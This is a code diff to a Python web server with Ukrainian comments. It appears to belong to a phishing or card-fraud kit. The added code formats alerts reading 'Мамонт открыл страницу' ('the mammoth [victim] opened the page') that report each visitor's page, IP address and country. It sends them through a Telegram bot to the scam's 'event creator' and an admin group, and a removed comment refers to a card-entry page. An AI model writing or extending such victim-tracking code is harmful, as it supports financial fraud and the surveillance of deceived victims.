@@ -958,18 +958,58 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     print(f"📤 Лог надіслано event creator {extra_user_id}")
                 except Exception as e:
                     print(f"❌ Помилка надсилання event creator: {e}")
-            # НЕ логуємо інші сторінки
+            # Логуємо інші сторінки для event creator
+            elif extra_user_id and should_log and page_code:
+                # Отримуємо назву сторінки
+                page_name = get_page_name(norm_path)
+                
+                # Формуємо лог у потрібному форматі
+                message = (
+                    f"🔔Мамонт открыл страницу\n\n"
+                    f"📎Страница: {page_name}\n"
+                    f"#️⃣Ссылка: ?page={page_code}\n"
+                    f"📶IP: {ip}\n"
+                    f"🌎Страна: {country}"
+                )
+                
+                # Надсилаємо event creator
+                try:
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                    data = {"chat_id": extra_user_id, "text": message}
+                    requests.post(url, data=data, timeout=1)
+                    print(f"📤 Лог надіслано event creator {extra_user_id} для сторінки: {page_name}")
+                except Exception as e:
+                    print(f"❌ Помилка надсилання event creator: {e}")
         elif is_telegram:
             pass  # Не логуємо Telegram запити
         elif extra_user_id and not should_log:
             pass  # Не логуємо не-сторінки
         elif extra_user_id and not page_code:
             pass  # Не логуємо без page_code
+        elif should_log and not is_telegram:
+            # Логуємо сторінки без page_code (головна, івенти тощо)
+            page_name = get_page_name(norm_path)
+            country = get_country_by_ip(ip)
+            
+            # Формуємо лог у потрібному форматі
+            message = (
+                f"🔔Мамонт открыл страницу\n\n"
+                f"📎Страница: {page_name}\n"
+                f"#️⃣Ссылка: {norm_path}\n"
+                f"📶IP: {ip}\n"
+                f"🌎Страна: {country}"
+            )
+            
+            # Надсилаємо в групу адміністраторів
+            try:
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                data = {"chat_id": GROUP_ID, "text": message}
+                requests.post(url, data=data, timeout=1)
+                print(f"📤 Лог надіслано в групу для сторінки: {page_name}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання в групу: {e}")
         else:
             pass  # Не логуємо зайві повідомлення
-        
-        # НЕ логуємо в групу - тільки для event creator на сторінці введення карти
-        pass
         
         # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
         if should_ignore_first_visit:
